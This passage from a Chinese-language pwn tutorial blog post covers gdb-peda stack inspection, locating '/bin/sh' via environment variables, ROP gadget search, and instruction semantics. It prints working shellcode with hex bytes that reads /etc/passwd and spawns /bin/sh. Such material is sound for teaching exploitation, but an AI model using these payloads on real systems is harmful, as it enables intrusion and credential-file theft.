0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 100\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd48 --> 0x7fffffffdde0 --> 0x1 \n0072| 0x7fffffffdd50 --> 0x0 \n0080| 0x7fffffffdd58 --> 0x0 \n0088| 0x7fffffffdd60 --> 0xe8ddf05985fd83be \n0096| 0x7fffffffdd68 --> 0xe8dde0e6894383be \n0104| 0x7fffffffdd70 --> 0x7fff00000000 \n0112| 0x7fffffffdd78 --> 0x0 \n0120| 0x7fffffffdd80 --> 0x0 \n0128| 0x7fffffffdd88 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd90 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd98 --> 0x2225ab63 \n0152| 0x7fffffffdda0 --> 0x0 \n0160| 0x7fffffffdda8 --> 0x0 \n0168| 0x7fffffffddb0 --> 0x0 \n0176| 0x7fffffffddb8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddc0 --> 0x7fffffffdde0 --> 0x1 \n0192| 0x7fffffffddc8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/100)\n0200| 0x7fffffffddd0 --> 0x7fffffffddd8 --> 0x1c \n0208| 0x7fffffffddd8 --> 0x1c \n0216| 0x7fffffffdde0 --> 0x1 \n0224| 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffddf0 --> 0x0 \n0240| 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffde00 --> 0x7fffffffe1dd (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffde08 --> 0x7fffffffe7c9 (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde10 --> 0x7fffffffe7e4 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde18 --> 0x7fffffffe806 (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde20 --> 0x7fffffffe81b (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde28 --> 0x7fffffffe833 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde30 --> 0x7fffffffe84a (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde38 --> 0x7fffffffe859 (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde40 --> 0x7fffffffe86a (\"DISPLAY=:0\")\n0320| 0x7fffffffde48 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0328| 0x7fffffffde50 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0336| 0x7fffffffde58 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0344| 0x7fffffffde60 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0352| 0x7fffffffde68 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0360| 0x7fffffffde70 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0368| 0x7fffffffde78 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0376| 0x7fffffffde80 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0384| 0x7fffffffde88 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n0392| 0x7fffffffde90 --> 0x7fffffffe96b (\"USER=tianji\")\n--More--(50/100)\n0400| 0x7fffffffde98 --> 0x7fffffffe977 (\"DESKTOP_SESSION=ubuntu\")\n0408| 0x7fffffffdea0 --> 0x7fffffffe98e (\"QT4_IM_MODULE=fcitx\")\n0416| 0x7fffffffdea8 --> 0x7fffffffe9a2 (\"TEXTDOMAINDIR=/usr/share/locale/\")\n0424| 0x7fffffffdeb0 --> 0x7fffffffe9c3 (\"GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa\")\n0432| 0x7fffffffdeb8 --> 0x7fffffffea19 (\"DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path\")\n0440| 0x7fffffffdec0 --> 0x7fffffffea4c (\"PWD=/home/tianji/Desktop/sploit/bypassaslr_1\")\n0448| 0x7fffffffdec8 --> 0x7fffffffea79 (\"LINES=24\")\n0456| 0x7fffffffded0 --> 0x7fffffffea82 (\"HOME=/home/tianji\")\n0464| 0x7fffffffded8 --> 0x7fffffffea94 (\"TEXTDOMAIN=im-config\")\n0472| 0x7fffffffdee0 --> 0x7fffffffeaa9 (\"SSH_AGENT_PID=1606\")\n0480| 0x7fffffffdee8 --> 0x7fffffffeabc (\"QT_ACCESSIBILITY=1\")\n0488| 0x7fffffffdef0 --> 0x7fffffffeacf (\"XDG_SESSION_TYPE=x11\")\n0496| 0x7fffffffdef8 --> 0x7fffffffeae4 (\"XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop\")\n0504| 0x7fffffffdf00 --> 0x7fffffffeb37 (\"XDG_SESSION_DESKTOP=ubuntu\")\n0512| 0x7fffffffdf08 --> 0x7fffffffeb52 (\"LC_ADDRESS=zh_CN.UTF-8\")\n0520| 0x7fffffffdf10 --> 0x7fffffffeb69 (\"GJS_DEBUG_OUTPUT=stderr\")\n0528| 0x7fffffffdf18 --> 0x7fffffffeb81 (\"LC_NUMERIC=zh_CN.UTF-8\")\n0536| 0x7fffffffdf20 --> 0x7fffffffeb98 (\"ALL_PROXY=socks://127.0.0.1:1080/\")\n0544| 0x7fffffffdf28 --> 0x7fffffffebba (\"no_proxy=localhost,127.0.0.0/8,::1\")\n0552| 0x7fffffffdf30 --> 0x7fffffffebdd (\"GTK_MODULES=gail:atk-bridge\")\n0560| 0x7fffffffdf38 --> 0x7fffffffebf9 (\"NO_PROXY=localhost,127.0.0.0/8,::1\")\n0568| 0x7fffffffdf40 --> 0x7fffffffec1c (\"COLUMNS=79\")\n0576| 0x7fffffffdf48 --> 0x7fffffffec27 (\"WINDOWPATH=1\")\n0584| 0x7fffffffdf50 --> 0x7fffffffec34 (\"SHELL=/bin/bash\")\n0592| 0x7fffffffdf58 --> 0x7fffffffec44 (\"VTE_VERSION=5201\")\n```\n\n我们可以看到“SHELL=/bin/bash”的地址:`0x7fffffffec34`,然后去掉`SHELL`,这样“/bin/bash”的地址就是`0x7fffffffec3a`\n\n```\ngdb-peda$ x/s 0x7fffffffec3a\n0x7fffffffec3a:\t\"/bin/bash\"\n```\n\n当然，我这里是\"/bin/bash\",所以这方法不可行。这时候，可以添加环境变量。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffddd0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 200\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd38 --> 0x7fffffffddd0 --> 0x1 \n0072| 0x7fffffffdd40 --> 0x0 \n0080| 0x7fffffffdd48 --> 0x0 \n0088| 0x7fffffffdd50 --> 0x3e3e2b88b8ee246d \n0096| 0x7fffffffdd58 --> 0x3e3e3b37b470246d \n0104| 0x7fffffffdd60 --> 0x7fff00000000 \n0112| 0x7fffffffdd68 --> 0x0 \n0120| 0x7fffffffdd70 --> 0x0 \n0128| 0x7fffffffdd78 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd80 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd88 --> 0x22bf66c6 \n0152| 0x7fffffffdd90 --> 0x0 \n0160| 0x7fffffffdd98 --> 0x0 \n0168| 0x7fffffffdda0 --> 0x0 \n0176| 0x7fffffffdda8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddb0 --> 0x7fffffffddd0 --> 0x1 \n0192| 0x7fffffffddb8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/200)\n0200| 0x7fffffffddc0 --> 0x7fffffffddc8 --> 0x1c \n0208| 0x7fffffffddc8 --> 0x1c \n0216| 0x7fffffffddd0 --> 0x1 \n0224| 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffdde0 --> 0x0 \n0240| 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffddf0 --> 0x7fffffffe1d1 (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffddf8 --> 0x7fffffffe7bd (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde00 --> 0x7fffffffe7d8 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde08 --> 0x7fffffffe7fa (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde10 --> 0x7fffffffe80f (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde18 --> 0x7fffffffe827 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde20 --> 0x7fffffffe83e (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde28 --> 0x7fffffffe84d (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde30 --> 0x7fffffffe85e (\"DISPLAY=:0\")\n0320| 0x7fffffffde38 --> 0x7fffffffe869 (\"ABC=/bin/sh\")\n0328| 0x7fffffffde40 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0336| 0x7fffffffde48 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0344| 0x7fffffffde50 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0352| 0x7fffffffde58 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0360| 0x7fffffffde60 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0368| 0x7fffffffde68 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0376| 0x7fffffffde70 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0384| 0x7fffffffde78 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0392| 0x7fffffffde80 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n```\n\n可以看到\"/bin/sh\"的地址：`0x7fffffffe869 + 0x6 = 0x7fffffffe86e`。\n\n```\ngdb-peda$ x/s 0x7fffffffe86e\n0x7fffffffe86e:\t\"bin/sh\"\n```\n\n当然，这个方法仅限本地使用。\n\n## 反汇编代码\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"jmp rsp\"\nffe4\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"pop rdi; ret\"\n5fc3\ntianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm \"5fc3\"\n   0:    5f                       pop    edi\n   1:    c3                       ret\n```\n## 在可执行文件中找gadget\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln\n0x7f3\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............\n0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........\n0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..\n0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................\n0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....\n```\n\n可以看到5fc3的偏移位置就是: '0x7f3'\n\n方法二:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all\nGadgets information\n============================================================\n0x0000000000000707 : add bl, dh ; ret\n0x00000000000007ff : add bl, dh ; ret\n0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret\n0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret\n0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret\n0x0000000000000788 : add byte ptr [rax], al ; leave ; ret\n0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000706 : add byte ptr [rax], al ; ret\n0x00000000000007fe : add byte ptr [rax], al ; ret\n0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000000789 : add cl, cl ; ret\n0x00000000000005a3 : add esp, 8 ; ret\n0x0000000000000809 : add esp, 8 ; ret\n0x00000000000005a2 : add rsp, 8 ; ret\n0x0000000000000808 : add rsp, 8 ; ret\n0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax\n0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax\n0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax\n0x00000000000007d9 : call qword ptr [r12 + rbx*8]\n0x00000000000007da : call qword ptr [rsp + rbx*8]\n0x00000000000005a0 : call rax\n0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret\n0x000000000000059e : je 0x5a4 ; call rax\n0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax\n0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax\n0x0000000000000664 : jmp rax\n0x00000000000006b5 : jmp rax\n0x000000000000078a : leave ; ret\n0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret\n0x0000000000000785 : mov eax, 0 ; leave ; ret\n0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]\n0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]\n0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000007f8 : nop dword ptr [rax + rax] ; ret\n0x0000000000000701 : nop dword ptr [rax] ; ret\n0x00000000000006b3 : or al, 0x5d ; jmp rax\n0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret\n0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]\n0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007f0 : pop r14 ; pop r15 ; ret\n0x00000000000007f2 : pop r15 ; ret\n0x0000000000000663 : pop rbp ; jmp rax\n0x00000000000006b4 : pop rbp ; jmp rax\n0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000000670 : pop rbp ; ret\n0x00000000000006c0 : pop rbp ; ret\n0x00000000000006ff : pop rbp ; ret\n0x00000000000007f3 : pop rdi ; ret\n0x00000000000007f1 : pop rsi ; pop r15 ; ret\n0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000005a6 : ret\n0x0000000000000671 : ret\n0x00000000000006c1 : ret\n0x0000000000000700 : ret\n0x0000000000000709 : ret\n0x0000000000000708 : ret\n0x000000000000078b : ret\n0x00000000000007df : ret\n0x00000000000007f4 : ret\n0x0000000000000801 : ret\n0x0000000000000800 : ret\n0x000000000000080c : ret\n0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax\n0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax\n0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax\n0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax\n0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax\n0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax\n\nUnique gadgets found: 85\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep \"pop rdi ; ret\"\n0x00000000000007f3 : pop rdi ; ret\n```\n## shellcode编写\n\n读取/etc/passwd\n\n```\nBITS 64 \n; Author Mr.Un1k0d3r - RingZer0 Team \n; Read /etc/passwd Linux x86_64 Shellcode \n; Shellcode size 82 bytes \nglobal _start \nsection .text \n_start: \n    jmp _push_filename \n\n_readfile: \n    ; syscall open file \n    pop rdi   ; pop path value \n    ; NULL byte fix \n    xor byte [rdi + 11], 0x41 \n\n    xor rax, rax \n    add al, 2 \n    xor rsi, rsi  ; set O_RDONLY flag \n    syscall \n\n    ; syscall read file \n    sub sp, 0xfff \n    lea rsi, [rsp] \n    mov rdi, rax \n    xor rdx, rdx \n    mov dx, 0xfff   ; size to read \n    xor rax, rax \n    syscall \n\n    ; syscall write to stdout \n    xor rdi, rdi \n    add dil, 1 ; set stdout fd = 1 \n    mov rdx, rax \n    xor rax, rax \n    add al, 1 \n    syscall \n\n    ; syscall exit \n    xor rax, rax \n    add al, 60 \n    syscall \n\n_push_filename: \n    call _readfile \n    path: db \"/etc/passwdA\" \n```\n\n```\n$ nasm -f elf64 readfile.asm -o readfile.o \n$ for i in $(objdump  -d readfile.o | grep \"^ \" | cut  -f2); do echo  -n  '\\x'$i; done; echo \n\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 \n6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x \n0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ \nxc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f \n\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41 \n```\n\nexecve /bin/sh\n\n```\n.global _start\n_start:\n    xor %esi, %esi\n    # /bin//sh\n    movabs $0x68732f2f6e69622f, %rbx\n    push %rsi\n    push %rbx\n    push %rsp\n    pop %rdi\n    pushq $59\n    pop %rax\n    xor %edx, %edx\n    syscall\n```\n\n```\\\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh\n$ asd\nsh: 1: asd: not found\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep \"^ \" | cut -f2); do echo -n '\\x'$i; done; echo\n\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\n```\n## retn和leave和call\n\nretn: \n\n> 64位: pop rip;  rsp = rsp + 8\n>\n> 32位: pop eip; esp = esp + 4\n>\n> retn N操作：先eip=[esp]，然后esp=esp+4+N\n\nleave:\n\n> 64位: move rsp rbp; pop rbp               将rbp中的值传给rsp\n>\n> 32位: move esp ebp; pop ebp             将ebp中的值传给esp\n\ncall:\n\n> 64位: push rip; jump 目的位置\n>\n> 32位: push eip; jump 目的位置\n\n## 32位寻找偏移\n\n> pattern_create 50\n>\n> pattern_offset 字符串\n\n## 有符号整数比较和无符号整数比较\n\n| 指令 | 含义                                     | 运算符号 |\n| ---- | ---------------------------------------- | -------- |\n| jbe  | unsigned below or equal (lower or same)  | <=       |\n| jae  | unsigned above or equal (higher or same) | >=       |\n| jb   | unsigned below (lower)                   | <        |\n| ja   | unsigned above (higher)                  | >        |\n| jle  | signed less or equal                     | <=       |\n| jge  | signed greater or equal                  | >=       |\n| jl   | signed less than                         | <        |\n| jg   | signed greater than                      | >        |\n\n从上面的表中可以看出，\n\n对于无符号（unsigned）整数比较，使用的是单词是above或below；\n对于有符号(signed)整数比较，则使用的单词是greater或less。\n\n## 查找argv[0]变量的地址\n\n```\ngdb-peda$ find /home\nSearching for '/home' in: None ranges\nFound 6 results, display max 6 items:\n[stack] : 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffe8f4 (\"/home/tianji/Desktop/pwn/jarvis\")\n[stack] : 0x7fffffffeb12 (\"/home/tianji/Desktop/pwn/jarvis/smashes\")\n[stack] : 0x7fffffffeb48 (\"/home/tianji\")\n[stack] : 0x7fffffffeee7 (\"/home/tianji/.vimpkg/bin\")\n[stack] : 0x7fffffffefc8 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ find 0x7fffffffdff6\nSearching for '0x7fffffffdff6' in: None ranges\nFound 2 results, display max 2 items:\n   libc : 0x7ffff7dd0508 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffdc68 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ distance $rsp 0x7fffffffdc68\nFrom 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords\n```\n\n首先搜索字符串\"/home\",第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。\n\n当前$rsp的值就是 存在栈溢出变量的地址\n\n## ubuntu 16  64位默认加载地址\n\n运行程序，然后查看 /proc/pid/maps","source":"_posts/pwn前置知识.md","raw":"---\ntitle: pwn前置知识\ndate: 2018-06-08 09:46:21\ntags: pwn\n---\n\n## 调用约定\n\n32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.\n\n本文主要是介绍Linux平台下的漏洞利用, 所以就专注于`System V AMD64 ABI` 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.\n\n```\n$ cat victim.c\nint foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {\n    return a + b + c + d + e + f + g + h;\n}\nint main() {\n    foo(1, 2, 3, 4, 5, 6, 7, 8);\n    return 0;\n}\n$ gcc victim.c -o victim\n$ objdump -d victim | grep \"<main>:\" -A 11\n00000000000006a0 <main>:\n 6a0:   55                      push   rbp\n 6a1:   48 89 e5                mov    rbp,rsp\n 6a4:   6a 08                   push   0x8\n 6a6:   6a 07                   push   0x7\n 6a8:   41 b9 06 00 00 00       mov    